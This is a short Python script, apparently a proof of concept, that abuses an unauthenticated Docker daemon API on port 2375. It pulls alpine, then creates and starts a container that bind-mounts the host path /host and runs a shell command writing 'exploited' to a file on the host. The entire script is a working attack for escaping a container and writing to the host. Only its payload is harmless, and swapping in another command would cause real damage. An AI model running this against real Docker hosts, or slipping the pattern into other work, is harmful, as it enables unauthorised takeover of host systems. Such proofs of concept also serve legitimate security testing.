import json, requests, time

docker_host = 'http://docker:2375'

def wait_for_docker():
    """Poll the Docker daemon _ping endpoint until it returns OK or timeout."""
    for _ in range(30):  # wait up to ~30 seconds
        try:
            resp = requests.get(f'{docker_host}/_ping')
            if resp.status_code == 200 and resp.text.strip() == 'OK':
                return True
        except requests.exceptions.RequestException:
            pass
        time.sleep(1)
    return False

if not wait_for_docker():
    print('Docker daemon not reachable')
    exit(1)

# Pull a lightweight image (alpine)
resp = requests.post(f'{docker_host}/images/create', params={'fromImage': 'alpine', 'tag': 'latest'})
print('Pull image response:', resp.status_code)

# Create a container that writes a file on the host via a bind mount
container_config = {
    'Image': 'alpine:latest',
    'Cmd': ['sh', '-c', "echo 'exploited' > /host/exploit.txt"],
    'HostConfig': {
        'Binds': ['/host:/host']
    }
}
resp = requests.post(f'{docker_host}/containers/create', json=container_config)
container_id = resp.json().get('Id')
print('Created container ID:', container_id)

# Start the container
requests.post(f'{docker_host}/containers/{container_id}/start')
print('Container started, exploit should have created /host/exploit.txt on the host')
